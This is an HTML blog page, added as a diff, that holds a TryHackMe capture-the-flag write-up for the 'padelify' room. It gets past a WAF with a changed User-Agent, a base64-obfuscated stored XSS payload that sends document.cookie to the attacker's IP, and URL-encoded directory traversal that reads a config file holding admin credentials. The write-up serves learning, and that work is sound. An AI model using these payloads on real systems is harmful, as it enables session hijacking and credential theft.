@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="ro-ro">
+<head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">padelify | Cyber Blog-ul lui Novac</title>
+<meta property="og:title" content="padelify | Cyber Blog-ul lui Novac" />
+<meta name="twitter:title" content="padelify | Cyber Blog-ul lui Novac" />
+<meta itemprop="name" content="padelify | Cyber Blog-ul lui Novac" />
+<meta name="application-name" content="padelify | Cyber Blog-ul lui Novac" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="ro-ro" />
+<meta name="language" content="ro-ro" />
+
+  <link rel="alternate" hreflang="en" href="https://novaclearnscyber.github.io/blog/posts/writeups/padelify/" title="" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2026-10-09T12:40:51Z />
+    <meta property="article:published_time" content=2026-10-09T12:40:51Z />
+    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/writeups/padelify/" />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "padelify",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2026-10-09",
+        "description": "",
+        "wordCount":  458 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2026-10-09",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Cyber Blog-ul lui Novac"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.161.1">
+
+    
+    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/writeups/padelify/">
+  <meta property="og:site_name" content="Cyber Blog-ul lui Novac">
+  <meta property="og:title" content="padelify">
+  <meta property="og:description" content="Reconnaissance First things first, it’s time to look for information.
+I tried running a gobuster scan with a common wordlist for discovery, but nothing returned; surely a WAF (Web Application Firewall) is blocking access:
+Let’s try to bypass it. Using the -a flag bypasses it pretty simply:
+For beginners (like me), the -a flag uses a different User-Agent than the default gobuster agent. A User-Agent is a string of characters that identifies the client making requests to the site.">
+  <meta property="og:locale" content="ro_ro">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:modified_time" content="2026-10-09T12:40:51+00:00">
+    <meta property="article:tag" content="Note">
+    <meta property="article:tag" content="Journal">
+    <meta property="article:tag" content="CyberStuff">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="padelify">
+  <meta name="twitter:description" content="Reconnaissance First things first, it’s time to look for information.
+I tried running a gobuster scan with a common wordlist for discovery, but nothing returned; surely a WAF (Web Application Firewall) is blocking access:
+Let’s try to bypass it. Using the -a flag bypasses it pretty simply:
+For beginners (like me), the -a flag uses a different User-Agent than the default gobuster agent. A User-Agent is a string of characters that identifies the client making requests to the site.">
+
+
+    
+
+    <link rel="canonical" href="https://novaclearnscyber.github.io/blog/posts/writeups/padelify/">
+    <link href="/blog/style.min.e390ba7da26222f4dc42a349955d76dbbe44e5ce2535a43de5a70633a0a9ec3c.css" rel="stylesheet">
+    <link href="/blog/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/blog/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/blog/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/blog/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/blog/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/blog/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://novaclearnscyber.github.io/blog/site.webmanifest">
+
+<meta name="msapplication-config" content="/blog/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+    <meta name="color-scheme" content="light dark">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/blog/icons/favicon.svg">
+
+    
+    
+    
+      
+<link rel="icon" type="image/png" href="/favicon.png">
+<link rel="shortcut icon" href="/favicon.png">
+    
+</head>
+
+
+<body>
+    <div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://novaclearnscyber.github.io/blog/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/blog/categories/">
+                        Categories
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            
+        </div>
+    </nav>
+</div>
+
+    <style>
+        .custom-banner {
+            width: 100%;
+
+            height: {
+                    {
+                    .Site.Params.banner_height | default "300px"
+                }
+            }
+
+            ;
+            overflow: hidden;
+            position: relative;
+        }
+
+        @media (max-width: 768px) {
+            .custom-banner {
+                height: 200px !important;
+                 
+            }
+        }
+    </style>
+
+    
+    <div class="custom-banner">
+        <div
+            style="background-image: url('https://novaclearnscyber.github.io/blog/siteBackcopy.png'); width: 100%; height: 100%; background-size: cover; background-position: center;">
+        </div>
+    </div>
+    
+
+    <div id="content">
+        
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">padelify</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-10-09T12:40:51&#43;00:00" itemprop="datePublished"> 9 oct. 2026 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <h3 id="reconnaissance">Reconnaissance</h3>
+<p>First things first, it&rsquo;s time to look for information.</p>
+<p>I tried running a gobuster scan with a common wordlist for discovery, but nothing returned; surely a WAF (Web Application Firewall) is blocking access:<br>
+<img src="/blog/images/static/Pasted%20image%2020260117111458.png" alt="">
+</p>
+<p>Let&rsquo;s try to bypass it. Using the <code>-a</code> flag bypasses it pretty simply:<br>
+For beginners (like me), the <code>-a</code> flag uses a different User-Agent than the default gobuster agent. A User-Agent is a string of characters that identifies the client making requests to the site.</p>
+<p><img src="/blog/images/static/Pasted%20image%2020260117112836.png" alt="">
+<br>
+I&rsquo;m going to try another list; this one is too short, I think:</p>
+<p><img src="/blog/images/static/Pasted%20image%2020260117113229.png" alt="">
+<br>
+Better this way. Firefart is such a goated name.<br>
+Let&rsquo;s try to access <code>config</code>:</p>
+<p><img src="/blog/images/static/Pasted%20image%2020260117113720.png" alt="">
+<br>
+And the WAF is blocking it again, cool:</p>
+<p>Let&rsquo;s try to access the log file:<br>
+<img src="/blog/images/static/Pasted%20image%2020260117113943.png" alt="">
+<br>
+OK cool, it works:<br>
+<img src="/blog/images/static/Pasted%20image%2020260117114001.png" alt="">
+<br>
+And we have this cool error message here explaining that XSS (Cross-Site Scripting) attempts may be possible, and also that the <code>HttpOnly</code> flag is not set.</p>
+<h3 id="how-we-are-going-to-break-it">How we are going to break it</h3>
+<p>A WAF can be bypassed a few ways; one of them is using a base64 encoded string and the functions:<br>
+<code>atob()</code> — used to decode base64, and <code>eval()</code> for executing the resulting code.</p>
+<p>So let&rsquo;s start:</p>
+<p>First of all, let&rsquo;s start a server to catch the cookie/flag with <code>python3 -m http.server 80</code>.</p>
+<p>Then we go to the main sign up page and enter the following into the username field:</p>
+<pre tabindex="0"><code>&lt;body` 
+`onload=&#34;eval(atob(&#39;ZmV0Y2goJ2h0dHA6Ly8xOTIuMTY4LjE0NS40LycrZG9jdW1lbnQuY29va2llKQ==&#39;))&#34;&gt;
+</code></pre><p>The encoded part is:</p>
+<pre tabindex="0"><code>fetch(&#39;http://&lt;YOUR IP&gt;/&#39;+document.cookie)
+</code></pre><p>This will go straight to the app and be executed.<br>
+In the password field, just enter something random.</p>
+<p>And bam bam bam, we got something:<br>
+<img src="/blog/images/static/Pasted%20image%2020260117121034.png" alt="">
+</p>
+<p>Now we just change our cookie to that string:<br>
+<code>PHPSESSID=pgulj9vf9eckvcpetht9ma6cmf</code></p>
+<p>Now we just go and change the cookie (press F12 and go to the Storage section, then Cookies):</p>
+<p><img src="/blog/images/static/Pasted%20image%2020260117124301.png" alt="">
+</p>
+<p>And we have the first flag:<br>
+<strong>Flag:</strong> THM{Logged_1n_Moderat0r}</p>
+<h3 id="second-flag">Second Flag</h3>
+<p>Note: If you see a different IP, it is because I had to restart the challenge.</p>
+<p>I clicked on the Live button in the top right corner of the previous panel and got the following:<br>
+<img src="/blog/images/static/Pasted%20image%2020260117162139.png" alt="">
+<br>
+And if we look at the URL we see something interesting: <code>page=match.php</code>. Let&rsquo;s try to exploit it via directory traversal:<br>
+<img src="/blog/images/static/Pasted%20image%2020260117162216.png" alt="">
+<br>
+And the WAF is blocking us again:<br>
+<img src="/blog/images/static/Pasted%20image%2020260117162422.png" alt="">
+</p>
+<p>Let&rsquo;s maybe try to encode the character <code>/</code>.</p>
+<p>I encoded <code>/</code> as <code>%2F</code> (or <code>..%2F</code> for <code>../</code>), which is URL encoding:</p>
+<p><img src="/blog/images/static/Pasted%20image%2020260117162541.png" alt="">
+<br>
+This is something interesting.</p>
+<p>Let&rsquo;s try to read the config file with this vulnerability:<br>
+<img src="/blog/images/static/Pasted%20image%2020260117163601.png" alt="">
+<br>
+Note: Don&rsquo;t forget to encode <code>.</code> as <code>%2E</code> or else it will not work.<br>
+Cool, very cool, we got it!<br>
+We can see some information in <code>app.conf</code> about the admin credentials:<br>
+<code>admin_info = &quot;bL}8,S9W1o44&quot;</code><br>
+Let&rsquo;s try to log in with this.</p>
+<p>And with username <code>admin</code> and the password from above, we succeeded in logging in:<br>
+<img src="/blog/images/static/Pasted%20image%2020260117163937.png" alt="">
+<br>
+<strong>Flag:</strong> THM{Logged_1n_Adm1n001}<br>
+Very cool challenge, thank you THM!</p>
+
+            </div>
+        </article></main>
+</div>
+
+    </div>
+    <footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+</div>
+    <small class="footer_copyright">
+        © 2026 .
+        
+    </small>
+</footer>
+</body>
+
+</html>
